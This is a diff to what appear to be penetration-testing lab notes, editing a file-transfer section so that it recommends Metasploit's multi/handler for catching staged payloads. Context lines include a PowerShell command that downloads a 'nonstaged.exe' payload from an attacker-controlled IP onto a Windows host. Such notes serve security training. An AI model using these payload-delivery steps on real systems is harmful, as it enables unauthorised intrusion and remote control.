@@ -5,7 +5,7 @@
 - If you cannot run executables like whoami, systeminfo; then go to `C:\Windows\system32` folder to run this commands, because they may not be on our `PATH`.
 
 # File Transfer
-**Note: Netcat doesn't know how to handle a staged payload**
+**Note: Netcat doesn't know how to handle a staged payload. To get a functional interactive command prompt, we can use Metasploit's `multi/handler` module, which works for the majority of staged, non-staged, and more advanced payloads.**
 PowerShell:
 ```
 iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe
